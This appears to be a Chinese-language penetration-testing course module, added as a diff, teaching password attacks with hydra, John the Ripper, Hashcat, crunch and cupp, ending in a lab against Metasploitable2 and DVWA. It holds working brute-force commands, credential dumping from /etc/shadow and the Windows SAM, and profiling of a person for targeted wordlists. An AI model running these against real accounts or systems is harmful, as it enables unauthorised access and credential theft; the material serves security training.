@@ -1,0 +1,594 @@
+================================================================================
+模块05: 密码攻击与破解技术
+================================================================================
+
+【学习目标】
+1. 掌握hydra在线密码暴力破解 (SSH, FTP, HTTP表单)
+2. 学会John the Ripper离线密码破解 (Linux/Windows hash)
+3. 掌握Hashcat GPU加速破解技术
+4. 学会使用crunch和cupp生成定制字典
+5. 理解密码hash原理和常见hash类型
+
+【所需工具】(archstrike-base已预装)
+- hydra
+- john (John the Ripper)
+- hashcat
+- crunch
+- cupp (需手动安装: pip install cupp)
+
+================================================================================
+第一部分: 密码Hash基础
+================================================================================
+
+1.1 什么是密码Hash
+--------------------------------------------------
+Hash (散列) 是将任意长度的数据转换为固定长度输出的单向函数。
+密码系统存储的是密码的hash值, 而非明文密码。
+
+常见Hash算法:
+  - MD5: 128位, 已不安全 (但Web应用中仍常见)
+  - SHA-1: 160位, 已被攻破
+  - SHA-256/512: 较安全的标准hash
+  - NTLM: Windows本地认证使用的hash
+  - LM: 旧版Windows hash (极不安全)
+  - bcrypt: 带盐值的慢hash算法
+  - Argon2: 最新的安全hash算法
+
+1.2 Hash识别
+--------------------------------------------------
+  $1$xxxxxxxx$yyyyyyyyyyyy  → MD5 crypt (Linux)
+  $5$xxxxxxxx$yyyyyyyyyyyy  → SHA-256 crypt (Linux)
+  $6$xxxxxxxx$yyyyyyyyyyyy  → SHA-512 crypt (Linux)
+  $2a$ 或 $2b$ 或 $2y$      → bcrypt
+  $y$                        → yescrypt
+  32位十六进制                → 可能MD5
+  40位十六进制                → 可能SHA-1
+
+  使用hash-identifier或hashid识别:
+  hashid 'hash_string'
+
+1.3 密码攻击方式
+--------------------------------------------------
+  在线攻击: 通过网络服务实时尝试密码 (hydra, medusa)
+  离线攻击: 获取hash文件后在本地破解 (john, hashcat)
+
+  破解模式:
+    字典攻击: 使用预定义的密码列表 (rockyou.txt等)
+    规则攻击: 在字典基础上应用变换规则
+    掩码攻击: 按指定字符集和长度穷举
+    组合攻击: 组合两个字典中的单词
+    混合攻击: 字典+掩码组合
+
+================================================================================
+第二部分: hydra 在线密码爆破
+================================================================================
+
+2.1 工具介绍
+--------------------------------------------------
+hydra (THC-Hydra) 是最快速的在线密码破解工具, 支持50+种协议。
+
+2.2 基本命令格式
+--------------------------------------------------
+hydra -l <username> -p <password> <target> <protocol>
+hydra -L <userlist> -P <wordlist> <target> <protocol>
+hydra -C <user:pass_file> <target> <protocol>
+
+2.3 SSH爆破
+--------------------------------------------------
+  # 单用户单密码测试
+  hydra -l root -p toor ssh://192.168.1.100
+
+  # 单用户+字典
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+  # 用户列表+密码列表
+  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+  # 指定端口
+  hydra -l root -P pass.txt -s 2222 ssh://192.168.1.100
+
+  # 增加线程
+  hydra -l root -P pass.txt -t 4 ssh://192.168.1.100
+
+  # 详细输出
+  hydra -l root -P pass.txt -V ssh://192.168.1.100
+
+2.4 FTP爆破
+--------------------------------------------------
+  hydra -L users.txt -P pass.txt ftp://192.168.1.100
+  hydra -l anonymous -P pass.txt ftp://192.168.1.100
+
+2.5 HTTP表单爆破 (最重要)
+--------------------------------------------------
+
+HTTP POST表单:
+  hydra -l admin -P wordlist.txt 192.168.1.100 \
+    http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+  格式分解: "path:post_params:失败条件"
+    - path: /login.php
+    - post_params: user=^USER^&pass=^PASS^  (^USER^和^PASS^是占位符)
+    - 失败条件: F=incorrect (登录失败时页面包含的字串)
+
+HTTP GET表单:
+  hydra -l admin -P wordlist.txt 192.168.1.100 \
+    http-get-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
+
+HTTP Basic认证:
+  hydra -l admin -P wordlist.txt 192.168.1.100 http-get /protected/
+
+常见失败条件:
+  F=incorrect              # 页面包含"incorrect"
+  F=Login failed           # 页面包含"Login failed"
+  S=success                # 成功标记 (页面包含"success")
+  S=302                    # HTTP 302重定向 (登录成功通常重定向)
+  H=Location: dashboard    # 响应头包含特定内容
+  :C=/login.php           # 登录失败可能重定向回登录页
+
+带复杂参数的POST:
+  hydra -l admin -P pass.txt 192.168.1.100 http-post-form \
+    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=is incorrect"
+
+2.6 其他协议示例
+--------------------------------------------------
+  # MySQL
+  hydra -l root -P pass.txt mysql://192.168.1.100
+
+  # SMB
+  hydra -l Administrator -P pass.txt smb://192.168.1.100
+
+  # RDP
+  hydra -l admin -P pass.txt rdp://192.168.1.100
+
+  # Telnet
+  hydra -l root -P pass.txt telnet://192.168.1.100
+
+  # SMTP
+  hydra -l user@domain.com -P pass.txt smtp://192.168.1.100
+
+  # HTTP-POST for JSON API
+  hydra -l admin -P pass.txt 192.168.1.100 http-post-form \
+    "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=401"
+
+2.7 hydra 高级选项
+--------------------------------------------------
+  -t 4               # 线程数 (默认16, SSH建议4)
+  -w 5               # 最大响应等待时间(秒)
+  -e nsr             # 额外检查: n=空密码, s=用户名为密码, r=反向用户名
+  -o found.txt       # 输出成功密码到文件
+  -vV                # 显示每次尝试 (详细模式)
+  -f                 # 找到第一组有效密码后停止
+  -R                 # 恢复之前的任务
+
+================================================================================
+第三部分: John the Ripper 使用
+================================================================================
+
+3.1 工具介绍
+--------------------------------------------------
+John the Ripper (JtR) 是最流行的离线密码破解工具,
+支持数百种密码hash格式。适合破解从系统中提取的hash。
+
+3.2 获取密码Hash
+--------------------------------------------------
+
+Linux系统:
+  sudo unshadow /etc/passwd /etc/shadow > hashes.txt
+  # unshadow将passwd和shadow组合为John可读格式
+
+Windows系统 (SAM文件):
+  # 从注册表导出
+  reg save HKLM\SAM sam.save
+  reg save HKLM\SYSTEM system.save
+  # 或使用Meterpreter的hashdump命令
+
+单个hash文件 (hash.txt内容示例):
+  root:$6$saltsalt$encryptedpasswordhash:0:0:root:/root:/bin/bash
+
+3.3 基本破解命令
+--------------------------------------------------
+
+  # 自动检测hash类型并破解
+  john hashes.txt
+
+  # 使用字典
+  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+  # 指定hash格式
+  john --format=raw-md5 hash.txt
+  john --format=NT hashes.txt             # Windows NTLM
+  john --format=raw-sha256 hash.txt
+
+  # 指定规则破解
+  john --wordlist=rockyou.txt --rules hashes.txt
+
+  # 显示已破解密码
+  john --show hashes.txt
+
+  # 恢复中断的破解
+  john --restore
+
+  # 查看所有支持的格式
+  john --list=formats
+
+3.4 常用格式选项
+--------------------------------------------------
+  --format=raw-md5           # 纯MD5
+  --format=raw-sha1          # 纯SHA-1
+  --format=raw-sha256        # 纯SHA-256
+  --format=NT                # Windows NTLM
+  --format=LM                # Windows LM
+  --format=crypt             # 标准Unix DES
+  --format=bcrypt            # bcrypt hash
+  --format=sha512crypt       # Linux SHA-512 ($6$)
+  --format=md5crypt          # Linux MD5 ($1$)
+  --format=wpapsk            # WPA/WPA2 PSK
+  --format=pdf               # PDF密码
+  --format=rar               # RAR密码
+  --format=zip               # ZIP密码
+
+3.5 规则(Rules)使用
+--------------------------------------------------
+规则是对字典单词的变换操作:
+  - 大小写转换
+  - 添加数字/特殊字符
+  - 字符替换 (a→@, s→$, o→0)
+  - 单词反转
+
+使用规则:
+  john --wordlist=dic.txt --rules=Single hashes.txt
+
+规则文件位置: /etc/john/john.conf (或 john.conf)
+常用规则段:
+  [List.Rules:Wordlist]      # 基础规则
+  [List.Rules:Single]        # 单单词模式规则
+  [List.Rules:Extra]         # 额外规则
+
+================================================================================
+第四部分: Hashcat 使用
+================================================================================
+
+4.1 工具介绍
+--------------------------------------------------
+Hashcat 是世界上最快的密码破解工具, 支持GPU加速。
+支持300+种hash算法, 多种攻击模式。
+
+4.2 Hash类型代码
+--------------------------------------------------
+常用hash模式代码 (-m):
+  0      MD5
+  100    SHA-1
+  1400   SHA-256
+  1700   SHA-512
+  1000   NTLM
+  3000   LM
+  3200   bcrypt $2*$, Blowfish
+  1800   sha512crypt $6$ (Unix)
+  500    md5crypt $1$ (Unix)
+  22000  WPA-PBKDF2-PMKID+EAPOL
+  11600  7-Zip
+  12500  RAR3-hp
+  13000  RAR5
+  13600  WinZip
+  16800  WPA-PMKID-PBKDF2
+  13773  VeraCrypt
+  0      MySQL 4.1/5
+
+查看完整列表: hashcat --help | grep -A 1000 "Hash modes"
+
+4.3 攻击模式
+--------------------------------------------------
+  -a 0   字典攻击 (Straight)
+  -a 1   组合攻击 (Combination)
+  -a 3   掩码攻击 (Brute-force)
+  -a 6   混合攻击: 字典+掩码 (Hybrid Wordlist + Mask)
+  -a 7   混合攻击: 掩码+字典 (Hybrid Mask + Wordlist)
+
+4.4 基本命令
+--------------------------------------------------
+
+  # 字典攻击
+  hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+  # 带规则攻击
+  hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule
+
+  # 掩码攻击 (8位小写字母)
+  hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l
+
+  # 掩码攻击 (8位小写+数字)
+  hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1
+
+  # 掩码攻击 (8位, 首字母大写+小写+数字)
+  hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?l?d?d
+
+  # 显示已破解密码
+  hashcat -m 0 hash.txt --show
+
+4.5 掩码字符集
+--------------------------------------------------
+  ?l  = abcdefghijklmnopqrstuvwxyz               (小写字母)
+  ?u  = ABCDEFGHIJKLMNOPQRSTUVWXYZ               (大写字母)
+  ?d  = 0123456789                                (数字)
+  ?s  = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~       (特殊字符)
+  ?a  = ?l?u?d?s                                  (全部)
+  ?h  = 8 bit characters from 0xc0 - 0xff (十六进制)
+  ?H  = 8 bit characters from 0x80 - 0xff (十六进制)
+  ?b  = 0x00 - 0xff (二进制)
+
+自定义字符集:
+  -1 ?l?d          # 自定义字符集1 = 小写+数字
+  -2 ?l?u?d?s      # 自定义字符集2 = 全部
+  -3 abcABC123      # 自定义字符集3 = 指定字符
+
+4.6 实用hashcat命令集合
+--------------------------------------------------
+  # NTLM hash字典攻击
+  hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt
+
+  # NTLM + 规则
+  hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r rules/best64.rule
+
+  # Linux SHA-512 ($6$)
+  hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt
+
+  # WPA/WPA2
+  hashcat -m 22000 wpa.hc22000 rockyou.txt
+
+  # MD5字典+规则
+  hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt -r rules/leetspeak.rule
+
+  # 掩码攻击: 手机号 (1开头11位)
+  hashcat -m 0 -a 3 hashes.txt 1?d?d?d?d?d?d?d?d?d?d
+
+  # 掩码攻击: 常见密码模式
+  hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d
+
+  # 组合攻击 (两个字典交叉组合)
+  hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt
+
+4.7 性能优化
+--------------------------------------------------
+  -w 3             # 工作负载配置 (1-4, 默认2)
+  -O               # 优化内核 (限制密码长度, 提高速度)
+  --force          # 忽略警告强制执行
+  --session name   # 命名会话 (可恢复)
+  --restore        # 恢复中断的会话
+  --status         # 显示当前进度
+  --status-timer 5 # 每5秒更新进度
+  -o found.txt     # 输出破解结果到文件
+
+示例:
+  hashcat -m 1000 -a 3 -O -w 3 --session ntlm_brute \
+    -1 ?l?d ntlm.txt ?1?1?1?1?1?1?1?1
+
+================================================================================
+第五部分: crunch 字典生成
+================================================================================
+
+5.1 工具介绍
+--------------------------------------------------
+crunch 可以根据指定规则生成密码字典 (单词列表)。
+
+5.2 基本语法
+--------------------------------------------------
+crunch <min> <max> <charset> [options]
+
+  # 生成6-8位纯数字字典
+  crunch 6 8 0123456789 -o number_dict.txt
+
+  # 生成6-8位小写字母字典
+  crunch 6 8 abcdefghijklmnopqrstuvwxyz -o lower_dict.txt
+
+  # 使用简写: @ = 小写, , = 大写, % = 数字, ^ = 特殊字符
+  crunch 8 8 -t @@@@@@@@ -o 8char_lower.txt
+
+  # 模式: @代表小写, ,代表大写, %代表数字, ^代表特殊
+  crunch 8 8 -t Pass%%%% -o pass4digit.txt
+  (生成: Pass0000 到 Pass9999)
+
+5.3 高级用法
+--------------------------------------------------
+  # 从特定字符集生成
+  crunch 6 6 abc123!@# -o custom.txt
+
+  # 从模式结合字符集
+  crunch 6 8 -p word1 word2 word3    # 排列组合
+
+  # 指定起始字符串
+  crunch 5 5 -s abcde
+
+  # 限制输出文件大小
+  crunch 8 8 0123456789 -c 1000000 -o START   # 每个文件100万行
+
+  # 生成后直接传给hashcat (不存文件)
+  crunch 8 8 abc123 | hashcat -m 0 -a 0 hash.txt
+
+5.4 实用字典生成示例
+--------------------------------------------------
+  # 生日格式 (YYYYMMDD)
+  crunch 8 8 -t %%%%02%% -o birthday_02.txt   # 2月的生日
+
+  # 手机号 (13x开始)
+  crunch 11 11 -t 13%%%%%%%%% -o phone_cn.txt
+
+  # 简单密码模式 (大写+8小写+1数字)
+  crunch 10 10 -t ,@@@@@@@@% -o pattern1.txt
+
+  # 公司名+年份
+  crunch 12 12 -t company%%%% -o company_year.txt
+
+================================================================================
+第六部分: cupp 针对性字典生成
+================================================================================
+
+6.1 工具介绍
+--------------------------------------------------
+CUPP (Common User Passwords Profiler) 根据目标个人信息
+生成高针对性的密码字典, 适用于社工场景。
+
+6.2 交互使用
+--------------------------------------------------
+  启动: cupp -i
+  然后按提示输入目标信息:
+    - First Name: John
+    - Surname: Smith
+    - Nickname: Johnny
+    - Birthdate: 19900101
+    - Partner's name: Jane
+    - Partner's nickname: Janey
+    - Partner's birthdate: 19891225
+    - Child's name: ...
+    - Pet's name: Max
+    - Company name: AcmeCorp
+    - 额外关键词: football, barcelona
+
+  生成的文件: john.txt (以名字命名)
+
+6.3 命令行使用
+--------------------------------------------------
+  cupp -i                    # 交互式创建
+  cupp -w password.txt       # 从已有字典改进
+
+================================================================================
+第七部分: 实践练习
+================================================================================
+
+【路线指引 - 密码破解完整流程】
+
+=== 阶段一: 制作Hash样本 ===
+
+Step 1: 创建测试密码的hash
+  在终端输入:
+  echo -n "MyPass123" | md5sum | cut -d' ' -f1 > md5_test.txt
+  echo -n "admin" | md5sum | cut -d' ' -f1 >> md5_test.txt
+  echo -n "password123" | md5sum | cut -d' ' -f1 >> md5_test.txt
+
+Step 2: 为Metasploitable2创建hash文件
+  确保获得Metasploitable2的权限后:
+  在Metasploitable2上: cat /etc/shadow > ms2_shadow.txt
+  在攻击机上: sudo unshadow /etc/passwd ms2_shadow.txt > ms2_hashes.txt
+
+Step 3: 提取单个hash用于练习
+  复制ms2_hashes.txt中root用户的hash行到一个新文件:
+  grep "^root:" ms2_hashes.txt > root_hash.txt
+
+=== 阶段二: 使用John the Ripper破解 ===
+
+Step 4: 基本破解测试
+  john md5_test.txt
+  (自动检测hash类型并尝试内置字典)
+
+Step 5: 使用rockyou字典破解
+  john --wordlist=/usr/share/wordlists/rockyou.txt md5_test.txt
+
+Step 6: 显示破解结果
+  john --show md5_test.txt
+
+Step 7: 破解Metasploitable2的root hash
+  john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
+
+Step 8: 查看MS2中所有破解的密码
+  john --show ms2_hashes.txt
+
+=== 阶段三: 使用Hashcat破解 ===
+
+Step 9: 查看GPU信息
+  hashcat -I
+
+Step 10: 用Hashcat做MD5字典破解
+  hashcat -m 0 -a 0 md5_test.txt /usr/share/wordlists/rockyou.txt
+
+Step 11: 用Hashcat做MD5规则破解
+  hashcat -m 0 -a 0 md5_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/best64.rule
+
+Step 12: 用Hashcat做掩码攻击
+  # 尝试破解所有6位数字的MD5
+  hashcat -m 0 -a 3 md5_test.txt ?d?d?d?d?d?d
+  (可能无法破解, 但学习掩码语法)
+
+Step 13: NTLM hash破解 (如果有Windows hash)
+  # 创建测试NTLM hash
+  echo -n "test" | iconv -f ASCII -t UTF-16LE | openssl dgst -md4 | \
+    cut -d' ' -f2 > ntlm_test.txt
+  hashcat -m 1000 -a 0 ntlm_test.txt /usr/share/wordlists/rockyou.txt
+
+=== 阶段四: 生成定制字典 ===
+
+Step 14: 使用crunch生成字典
+  crunch 4 6 0123456789abcdef -o digits_4to6.txt
+  wc -l digits_4to6.txt       # 查看行数
+
+Step 15: 使用crunch模式生成特定字典
+  crunch 8 8 -t admin%%% -o admin_pass.txt
+  cat admin_pass.txt | head -20
+
+Step 16: 使用cupp生成定向字典
+  cupp -i
+  输入一个虚构目标的个人信息
+  生成后查看文件: cat john.txt | head -20
+
+=== 阶段五: hydra在线爆破Metasploitable2 ===
+
+Step 17: 确认Metasploitable2的SSH可用
+  nc -zv 192.168.1.100 22
+
+Step 18: 使用hydra爆破SSH
+  hydra -l msfadmin -P /usr/share/wordlists/fasttrack.txt \
+    ssh://192.168.1.100 -t 4 -V
+
+Step 19: 尝试FTP爆破
+  hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt \
+    ftp://192.168.1.100 -t 4
+
+  先创建users.txt:
+  echo "root" > users.txt
+  echo "msfadmin" >> users.txt
+  echo "user" >> users.txt
+  echo "admin" >> users.txt
+  echo "service" >> users.txt
+
+Step 20: 尝试HTTP表单爆破 (DVWA)
+  启动Metasploitable2的DVWA (浏览器访问)
+  使用Firefox打开: http://192.168.1.100/dvwa/login.php
+
+  在终端执行:
+  hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
+    192.168.1.100 http-post-form \
+    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+=== 阶段六: 编写破解总结 ===
+
+Step 21: 创建破解实践报告
+  echo "=== 密码破解实践报告 ===" > crack_report.txt
+  echo "" >> crack_report.txt
+  echo "1. 离线破解结果:" >> crack_report.txt
+  echo "   - John破解的hash:" >> crack_report.txt
+  john --show md5_test.txt >> crack_report.txt
+  echo "" >> crack_report.txt
+  echo "2. 在线爆破结果:" >> crack_report.txt
+  echo "   - hydra发现的SSH/FTP密码" >> crack_report.txt
+  echo "" >> crack_report.txt
+  echo "3. 字典统计:" >> crack_report.txt
+  echo "   - crunch生成: $(wc -l < digits_4to6.txt) 条" >> crack_report.txt
+  echo "   - cupp生成: $(wc -l < john.txt 2>/dev/null || echo 0) 条" >> crack_report.txt
+  echo "" >> crack_report.txt
+  echo "4. 安全建议:" >> crack_report.txt
+  echo "   - 使用强密码 (12+字符, 大小写+数字+特殊字符)" >> crack_report.txt
+  echo "   - 启用账户锁定策略" >> crack_report.txt
+  echo "   - 实施多因素认证(MFA)" >> crack_report.txt
+  echo "   - 定期审计密码强度" >> crack_report.txt
+
+【注意事项与提示】
+- 字典文件rockyou.txt位置: /usr/share/wordlists/rockyou.txt.gz (需解压)
+  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+- Online攻击会产生日志, 可能触发IDS/IPS告警
+- 在线攻击速度受限: hydra的SSH建议-t 4, FTP可用-t 16
+- Hashcat使用GPU时, 确保安装了正确的OpenCL/CUDA驱动
+- 在ArchStrike虚拟机中, Hashcat可能无法使用GPU, 使用--force跳过
+- LM hash极不安全, 有LM hash的系统应优先升级
+- 破解结果揭示了组织的密码策略弱点, 报告中应包含改进建议
+- 总是确保有授权才进行密码攻击, 未经授权构成犯罪
+
+================================================================================
